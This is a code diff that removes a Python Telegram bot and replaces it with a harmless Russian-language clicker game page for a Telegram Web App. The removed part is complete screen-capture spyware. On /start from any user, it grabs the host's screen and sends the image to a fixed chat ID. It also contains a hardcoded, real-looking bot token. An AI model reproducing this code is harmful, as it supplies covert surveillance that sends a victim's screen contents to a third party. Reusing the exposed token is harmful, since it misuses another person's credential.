@@ -1,34 +1,52 @@
-import telebot
-import os
-import platform
-import subprocess
-from PIL import ImageGrab
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Кликер</title>
+  <script src="https://telegram.org/js/telegram-web-app.js"></script>
+  <style>
+    body {
+      font-family: sans-serif;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      height: 100vh;
+      margin: 0;
+      background: #f0f0f0;
+    }
+    #score {
+      font-size: 2em;
+      margin-bottom: 20px;
+    }
+    #click-btn {
+      padding: 15px 30px;
+      font-size: 1.2em;
+      background: #3399ff;
+      color: white;
+      border: none;
+      border-radius: 10px;
+      cursor: pointer;
+    }
+  </style>
+</head>
+<body>
+  <div id="score">Счёт: 0</div>
+  <button id="click-btn">Клик!</button>
 
-BOT_TOKEN = '8479275418:AAHoXo5-aA69Rn_-pCewm90nFkgiWmBox2c'
-YOUR_CHAT_ID = 7821316793
+  <script>
+    const scoreEl = document.getElementById('score');
+    let score = 0;
 
-bot = telebot.TeleBot(BOT_TOKEN)
+    document.getElementById('click-btn').addEventListener('click', () => {
+      score++;
+      scoreEl.textContent = `Счёт: ${score}`;
+      // Опционально: отправить результат в бота через WebApp
+    });
 
-def take_screenshot():
-    try:
-        screenshot_path = "screenshot.png"
-        img = ImageGrab.grab()
-        img.save(screenshot_path)
-        return screenshot_path
-    except Exception:
-        return None
-
-@bot.message_handler(commands=['start'])
-def send_screenshot(m):
-    if m.from_user.id == YOUR_CHAT_ID or True:  # Ловим у всех, но можно ограничить
-        path = take_screenshot()
-        if path and os.path.exists(path):
-            try:
-                with open(path, 'rb') as photo:
-                    bot.send_photo(YOUR_CHAT_ID, photo)
-                os.remove(path)
-            except:
-                pass
-
-# Игнорируем остальные сообщения — только /start триггерит скрин
-bot.polling(none_stop=True)
+    // Закрытие безопасно (если нужно)
+    // Telegram.WebApp.ready();
+  </script>
+</body>
+</html>
